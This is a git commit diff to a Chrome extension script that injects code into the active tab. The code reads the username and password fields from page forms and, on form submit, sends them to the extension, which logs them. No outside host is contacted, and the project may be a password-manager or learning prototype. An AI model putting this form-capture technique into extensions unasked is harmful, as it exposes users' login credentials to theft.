c3c8d1f77e802ce62b49f025ca538e6f2db902e2
Mateusz Guz <mateuszguz54@gmail.com>
2022-01-21 00:38:42 +0100

    inject onsubmit event send message with creds to the extension

--- ChromeExtension/getcreds.js
+++ ChromeExtension/getcreds.js
@@ -1,5 +1,14 @@
 document.getElementById("getCreds").addEventListener("click", getCreds);
 
+chrome.runtime.onMessage.addListener(
+    function(request, sender) {
+        console.log(sender.tab ?
+                  "from a content script:" + sender.tab.url :
+                  "from the extension");
+        console.log(request.loginData);
+    }
+);
+
 function getCreds() {
     var query = { active: true, currentWindow: true };
     chrome.tabs.query(query, function (tabs) {
@@ -11,27 +20,23 @@ function getCreds() {
         });
     });
 }
-
-function findCreds() {
-    //var formData = new FormData(document.querySelector('form'))
+const findCreds = () => {
     var forms = document.forms;
-    var login = false, password = false;
     var loginData = {
         username: "",
         password: ""
     }
     Array.prototype.forEach.call(forms, form => {
         Array.prototype.forEach.call(form.elements, element =>{
-            if(element.type == "text" && !login){
+            if(element.type == "text" && loginData.username == "" && loginData.password == ""){
                 loginData.username = element.value;
-                login = true;
             }
-            if(element.type == "password" && !password){
+            if(element.type == "password" && loginData.password == ""){
                 loginData.password = element.value;
-                password = true;
+                form.addEventListener("submit", function (){
+                    chrome.runtime.sendMessage({loginData}); 
+                });
             }
         });
     });
-
-    console.log(loginData);
 }
